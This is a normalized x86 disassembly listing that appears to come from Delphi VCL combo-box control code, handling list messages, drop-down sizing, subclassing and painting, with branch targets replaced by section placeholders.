push 0x149
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4045dc
mov edx esi
xchg edx eax
call sub_4045dc
mov eax [ esi ]
call sub_404450
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42e088
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42e0ec
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_438a40
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_438a70
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e0f3
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_42e0f8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404450
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42e140
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_43f228
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_438f7c
sub_42e174
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e1e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404450
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e1ee
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
sub_42e1f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e26b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404450
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e272
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
sub_42e278
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43af54
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_4381fc
mov edx 0x19
mov eax ebx
call sub_438220
mov dl 0x1
mov eax ebx
call sub_43f45c
xor edx edx
mov eax ebx
call sub_438c04
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43761c
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_42e61c
call sub_41a1f0
mov [ ebx + 0x24c ] eax
push ebx
push sub_42e714
call sub_41a1f0
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_42e36c
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_43f52c
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_44f668
mov eax [ esi + 0x24c ]
call sub_44f668
mov eax [ esi + 0x208 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43b078
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_42e3ee
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_43c61c
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_42e438
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_43f228
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_42e45c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_43f228
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_43f228
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_42e4a4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_42e4d0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_43f228
push eax
call SendMessageA
sub_42e50c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_43f52c
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_43f228
push eax
call SendMessageA
sub_42e55c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_43f228
push eax
call SetWindowTextA
sub_42e598
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_42e438
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_42e5d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e840
pop esi
pop ebx
retn
mov eax ebx
call sub_43c7c8
sub_42e5f4
push ebx
mov ebx eax
mov eax ebx
call sub_43a618
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e61c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_44f7bc
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_438584
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4068b4
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_4390e8
jmp r-xdata
sub_42e748
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e9ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e07c
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e164
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42e438
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458f68
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403454
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7bc
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42c85c
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e22c
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42e438
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42e45c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42ea24
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_4391b0
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cc3c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43e22c
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41bd24
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_41c9a8
call sub_41bd24
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_41c9e4
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43cba8
test al al
jne r-xdata
mov eax ebx
call sub_42e438
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_42e45c
jmp r-xdata
sub_42eb32
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_42ec90
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec97
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
jmp [ eax * 4 + jump_table_42eb60 ]
mov eax edi
mov si 0xffe9
call sub_403454
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403454
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403454
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_438a70
mov eax edi
mov si 0xffeb
call sub_403454
mov eax edi
mov si 0xffb2
call sub_403454
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403454
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_43d9ac
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_43da98
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_43f228
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_43f228
push eax
call PostMessageA
jmp r-xdata
sub_42ecc4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ed6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_437634
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41d014
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed74
lea eax [ ebp - 0x14 ]
call sub_403f90
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_41d1c8
sub_42eda0
push esi
push edi
mov esi eax
mov eax esi
call sub_43aafc
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_42edc8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_43f52c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_42ee1c
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403454
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_42ee48
push ebx
mov ebx eax
mov eax ebx
call sub_43c1e0
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_43f228
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_42ee80
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_42ef16
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef1d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_42ef1d
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_42ef3c
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_42ef6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42efeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eff2
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_42eff8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_42f038
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_42f081
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f088
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_42f090
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e278
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403228
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_42f114
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403258
mov eax [ esi + 0x278 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e36c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_42f164
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_43c7c8
sub_42f1c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c0b4
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43bfe0
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_42f229
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_42ee48
mov eax ebx
call sub_43f228
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403258
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_43f228
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_42f36c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_43c5c4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_42f3bc
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41c9e4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_42f410
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_42f43c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42f4f8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_438a40
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
